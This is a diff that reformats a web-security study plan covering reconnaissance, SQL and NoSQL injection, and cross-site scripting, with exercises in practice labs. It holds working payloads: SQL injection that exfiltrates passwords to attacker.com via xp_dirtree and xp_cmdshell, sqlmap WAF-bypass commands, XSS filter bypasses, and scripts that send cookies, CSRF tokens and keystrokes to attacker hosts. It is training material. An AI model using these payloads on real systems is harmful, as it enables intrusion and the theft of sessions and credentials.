@@ -85,7 +85,6 @@ text
 - GitHub (for note-taking repository): [https://github.com](https://github.com)
 
 ---
-
 ## Day 1: Foundations + Reconnaissance Deep Dive
 
 **Study Time:** 4-5 hours
@@ -102,7 +101,7 @@ text
 
 #### Advanced Concepts
 
-- HTTP request smuggling fundamentals
+- HTTP request smuggling fundamentals[^1]
 - Cache poisoning basics
 - WebSocket protocol security
 - Server-Side Events (SSE) vulnerabilities
@@ -111,71 +110,103 @@ text
 #### Resources
 
 - MDN Web Docs: HTTP Complete Guide
-- PortSwigger: HTTP Request Smuggling
-- PortSwigger Web Security Academy
+- PortSwigger: HTTP Request Smuggling[^1]
+- PortSwigger Web Security Academy[^2]
 
 
 ### Afternoon: Advanced Reconnaissance (3 hours)
 
 #### Passive Recon (OSINT)
 
-Subdomain enumeration (aggressive approach)
+**Subdomain enumeration (aggressive approach)**
 
+```bash
 subfinder -d target.com -o subs.txt
 amass enum -passive -d target.com -o amass_subs.txt
 assetfinder --subs-only target.com | tee assetfinder_subs.txt
-Merge and resolve
+```
 
+**Merge and resolve**
+
+```bash
 cat *_subs.txt | sort -u | httpx -silent -o live_subs.txt
-Historical data
+```
 
+**Historical data**
+
+```bash
 echo "target.com" | waybackurls | tee wayback_urls.txt
 echo "target.com" | gau --blacklist png,jpg,gif,css | tee gau_urls.txt
-Parameter discovery from historical data
+```
 
+**Parameter discovery from historical data**
+
+```bash
 cat wayback_urls.txt | grep "?" | uro | tee params.txt
-Technology fingerprinting
+```
 
+**Technology fingerprinting**
+
+```bash
 whatweb target.com -v
+```
+
 
 #### Active Recon
 
-Port scanning
+**Port scanning**
 
+```bash
 nmap -sV -sC -p- target.com -oN nmap_full.txt
-Directory/file brute-forcing (advanced wordlists)
+```
 
-ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
--u [https://target.com/FUZZ](https://target.com/FUZZ)
--mc 200,301,302,401,403
--o ffuf_dirs.json
-Virtual host discovery
+**Directory/file brute-forcing (advanced wordlists)**
 
-ffuf -w /path/to/vhosts.txt -u [https://target.com](https://target.com) -H "Host: FUZZ.target.com"
-Parameter fuzzing
+```bash
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -u https://target.com/FUZZ \
+  -mc 200,301,302,401,403 \
+  -o ffuf_dirs.json
+```
 
-ffuf -w /path/to/params.txt -u [https://target.com/page?FUZZ=test](https://target.com/page?FUZZ=test)
+**Virtual host discovery**
 
-text
+```bash
+ffuf -w /path/to/vhosts.txt -u https://target.com -H "Host: FUZZ.target.com"
+```
+
+**Parameter fuzzing**
+
+```bash
+ffuf -w /path/to/params.txt -u "https://target.com/page?FUZZ=test"
+```
+
 
 #### JavaScript Analysis
 
-Extract JS files
+**Extract JS files**
 
+```bash
 cat live_subs.txt | subjs | tee js_files.txt
-Analyze JS for secrets, endpoints, parameters
+```
 
-python3 LinkFinder.py -i [https://target.com/app.js](https://target.com/app.js) -o endpoints.html
-Secret scanning
+**Analyze JS for secrets, endpoints, parameters**
 
+```bash
+python3 LinkFinder.py -i https://target.com/app.js -o endpoints.html
+```
+
+**Secret scanning**
+
+```bash
 trufflehog filesystem . --json | jq
+```
 
-text
 
 ### Practical Lab
 
 - Complete Juice Shop: "Score Board", "Exposed Metrics", "Privacy Policy"
-- PortSwigger Lab: Information Disclosure vulnerabilities (5 labs)
+- PortSwigger Lab: Information Disclosure vulnerabilities (5 labs)[^1]
 - Document reconnaissance findings in a structured note (Obsidian/Notion/GitHub)
 
 
@@ -187,7 +218,7 @@ text
 - [ ] Analyze JavaScript files for endpoints
 - [ ] Complete 5+ PortSwigger labs
 
----
+***
 
 ## Day 2: SQL Injection (Basic to Advanced)
 
@@ -205,41 +236,55 @@ text
 
 #### Manual Testing Workflow
 
-1. Detection
+**1. Detection**
 
+```text
 ' OR '1'='1
 " OR "1"="1
 ') OR ('1'='1
-2. Determine columns
+```
 
+**2. Determine columns**
+
+```text
 ' ORDER BY 1--
 ' ORDER BY 2--
-' ORDER BY 3-- (until error)
-3. UNION exploitation
+' ORDER BY 3--  # until error
+```
 
+**3. UNION exploitation**
+
+```text
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
 ' UNION SELECT NULL,NULL,NULL--
-4. Extract data
+```
 
+**4. Extract data**
+
+```text
 ' UNION SELECT username,password,NULL FROM users--
+```
 
-text
 
 ### Afternoon: Advanced SQL Injection (3 hours)
 
 #### Out-of-Band (OOB) SQLi
 
-DNS exfiltration (SQLi via DNS)
+**DNS exfiltration (SQLi via DNS)**
 
+```text
 '; EXEC master..xp_dirtree '\\attacker.com\share'--
-HTTP exfiltration
+```
 
+**HTTP exfiltration**
+
+```text
 '; DECLARE @data varchar(max);
 SELECT @data = (SELECT TOP 1 password FROM users);
 EXEC('master..xp_cmdshell ''powershell -c Invoke-WebRequest -Uri http://attacker.com/?data='+@data+'''')--
+```
 
-text
 
 #### Second-Order SQLi
 
@@ -249,6 +294,7 @@ text
 
 #### NoSQL Injection
 
+```text
 // MongoDB injection
 {"username": {"$ne": null}, "password": {"$ne": null}}
 {"username": {"$regex": "^admin"}, "password": {"$regex": ".*"}}
@@ -256,35 +302,42 @@ text
 // Test in JSON APIs
 POST /login
 {"username": {"$gt": ""}, "password": {"$gt": ""}}
+```
 
-text
 
 #### SQLMap Advanced Usage
 
-Authenticated scanning
+**Authenticated scanning**
 
-sqlmap -u "http://target.com/page?id=1"
---cookie="PHPSESSID=abc123"
---level=5 --risk=3
---technique=BEUSTQ
---threads=10
---batch
-Tamper scripts for WAF bypass
+```bash
+sqlmap -u "http://target.com/page?id=1" \
+  --cookie="PHPSESSID=abc123" \
+  --level=5 --risk=3 \
+  --technique=BEUSTQ \
+  --threads=10 \
+  --batch
+```
 
-sqlmap -u "http://target.com/page?id=1"
---tamper=space2comment,between
---random-agent
-Second-order SQLi
+**Tamper scripts for WAF bypass**
 
-sqlmap -u "http://target.com/profile"
---data="bio=test"
---second-url="http://target.com/view-profile"
+```bash
+sqlmap -u "http://target.com/page?id=1" \
+  --tamper=space2comment,between \
+  --random-agent
+```
 
-text
+**Second-order SQLi**
+
+```bash
+sqlmap -u "http://target.com/profile" \
+  --data="bio=test" \
+  --second-url="http://target.com/view-profile"
+```
+
 
 ### Practical Lab
 
-- PortSwigger SQL Injection: All 18 labs (including blind and advanced)
+- PortSwigger SQL Injection: All 18 labs (including blind and advanced)[^1]
 - DVWA: SQL Injection (Low, Medium, High, Impossible)
 - Juice Shop: "Login Admin", "User Credentials", "Christmas Special"
 - HTB: Easy SQL injection box (e.g., "Templated")
@@ -298,7 +351,7 @@ text
 - [ ] Learn SQLMap advanced features
 - [ ] Complete 18 PortSwigger labs
 
----
+***
 
 ## Day 3: Cross-Site Scripting (Basic to Advanced)
 
@@ -315,96 +368,110 @@ text
 
 #### Basic Payloads
 
-<script>alert(1)</script> <img src=x onerror=alert(1)> <svg onload=alert(1)> <iframe src="javascript:alert(1)"> ```
-Afternoon: Advanced XSS Techniques (3 hours)
-Filter Bypass Techniques
-
-text
-// Encoding bypass
-
+```html
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src="javascript:alert(1)">
 ```
+
+
+### Afternoon: Advanced XSS Techniques (3 hours)
+
+#### Filter Bypass Techniques
+
+```html
+<!-- Encoding bypass -->
 <script>alert(String.fromCharCode(88,83,83))</script>
-```
 
-// Case manipulation
+<!-- Case manipulation -->
 <ScRiPt>alert(1)</sCrIpT>
 
-// Event handler abuse
+<!-- Event handler abuse -->
 <body onload=alert(1)>
 <input onfocus=alert(1) autofocus>
 
-// HTML entity encoding
+<!-- HTML entity encoding -->
 <script>alert(1)</script>
 
-// JavaScript protocol
+<!-- JavaScript protocol -->
 <a href="javascript:alert(1)">click</a>
 
-// Polyglot XSS
+<!-- Polyglot XSS -->
 jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\x3e
+```
 
-Mutation XSS (mXSS)
 
-text
+#### Mutation XSS (mXSS)
 
+```html
 <!-- Browser parses differently than sanitizer -->
 <noscript><p title="</noscript><img src=x onerror=alert(1)>">
+```
 
-Blind XSS
 
-text
-// Payload sent to admin panel/backend
+#### Blind XSS
+
+```html
+<!-- Payload sent to admin panel/backend -->
 <script src="https://yourserver.com/xss.js"></script>
+```
 
-// On yourserver.com/xss.js:
+**On yourserver.com/xss.js:**
+
+```javascript
 document.location='https://yourserver.com/steal?cookie='+document.cookie;
+```
 
-DOM XSS Exploitation
 
-text
+#### DOM XSS Exploitation
+
+```javascript
 // Analyze JS source for sinks
 document.write(location.hash.substring(1));
+```
 
-// Exploit:
-https://target.com/page\#<img src=x onerror=alert(1)>
+**Exploit:**
 
-XSS to Account Takeover
+```text
+https://target.com/page#<img src=x onerror=alert(1)>
+```
 
-text
+
+#### XSS to Account Takeover
+
+```javascript
 // Session hijacking
 fetch('https://attacker.com/log?c='+document.cookie);
 
 // CSRF token stealing
 fetch('/api/csrf-token')
-.then(r => r.text())
-.then(token => fetch('https://attacker.com/log?csrf='+token));
+  .then(r => r.text())
+  .then(token => fetch('https://attacker.com/log?csrf='+token));
 
 // Keylogging
 document.onkeypress = function(e) {
-fetch('https://attacker.com/log?key='+e.key);
+  fetch('https://attacker.com/log?key='+e.key);
 }
+```
 
-Practical Lab
 
-    PortSwigger XSS: All 30+ labs (including context-specific, filter bypass, CSP)
-    
-    DVWA: XSS (all levels)
-    
-    Juice Shop: "DOM XSS", "Reflected XSS", "Bonus Payload", "Client-side XSS Protection"
-    
-    XSS Game by Google: All 6 levels
-    
-    HTB: Box with XSS to RCE chain
-    Today's Checklist
+### Practical Lab
 
-    Understand all three XSS types
-    
-    Master filter bypass techniques
-    
-    Practice mutation XSS
-    
-    Learn blind XSS exploitation
-    
-    Complete 30+ PortSwigger labs
+- PortSwigger XSS: All 30+ labs (including context-specific, filter bypass, CSP)[^1]
+- DVWA: XSS (all levels)
+- Juice Shop: "DOM XSS", "Reflected XSS", "Bonus Payload", "Client-side XSS Protection"
+- XSS Game by Google: All 6 levels
+- HTB: Box with XSS to RCE chain
+
+
+### Today's Checklist
+
+- [ ] Understand all three XSS types
+- [ ] Master filter bypass techniques
+- [ ] Practice mutation XSS
+- [ ] Learn blind XSS exploitation
+- [ ] Complete 30+ PortSwigger labs
 
 ---
 ## Day 4: Authentication \& Authorization Attacks
